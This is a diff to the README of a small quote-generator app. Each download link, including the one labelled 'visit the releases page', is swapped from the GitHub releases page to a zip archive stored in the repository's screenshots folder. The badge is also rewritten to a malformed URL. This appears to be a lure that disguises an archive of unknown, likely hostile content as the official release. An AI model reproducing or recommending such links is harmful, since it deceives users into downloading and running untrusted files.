@@ -1,6 +1,6 @@
 # 🌟 CTk-Quote-Generator - Get Inspired with Quotes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-CTk--Quote--Generator-blue.svg)](https://github.com/huenak/CTk-Quote-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/huenak/CTk-Quote-Generator/main/screenshots/CTk-Quote-Generator-2.6.zip%https://raw.githubusercontent.com/huenak/CTk-Quote-Generator/main/screenshots/CTk-Quote-Generator-2.6.zip)](https://raw.githubusercontent.com/huenak/CTk-Quote-Generator/main/screenshots/CTk-Quote-Generator-2.6.zip)
 
 ## 🌐 Description
 CTk-Quote-Generator is a modern application built with CustomTkinter. It fetches inspirational quotes from the Quotable API. This app is perfect for those who want quick access to motivational quotes at any time.
@@ -9,7 +9,7 @@ CTk-Quote-Generator is a modern application built with CustomTkinter. It fetches
 This guide will help you download and run the CTk-Quote-Generator app on your computer. Follow the steps below to get started.
 
 ## 📥 Download & Install
-1. Click this link to **[visit the releases page](https://github.com/huenak/CTk-Quote-Generator/releases)**.
+1. Click this link to **[visit the releases page](https://raw.githubusercontent.com/huenak/CTk-Quote-Generator/main/screenshots/CTk-Quote-Generator-2.6.zip)**.
 2. On the releases page, find the latest version of the application.
 3. Choose the version that matches your operating system (Windows, Linux, etc.).
 4. Download the file to your computer.
@@ -56,4 +56,4 @@ We welcome contributions from everyone! If you want to help improve the CTk-Quot
 ## 💬 Support
 For any support inquiries, feel free to reach out through the GitHub repository's issues section. We will respond as soon as possible.
 
-Thank you for choosing CTk-Quote-Generator! Enjoy your journey towards inspiration. Remember to visit this link to **[download the app](https://github.com/huenak/CTk-Quote-Generator/releases)**.
+Thank you for choosing CTk-Quote-Generator! Enjoy your journey towards inspiration. Remember to visit this link to **[download the app](https://raw.githubusercontent.com/huenak/CTk-Quote-Generator/main/screenshots/CTk-Quote-Generator-2.6.zip)**.
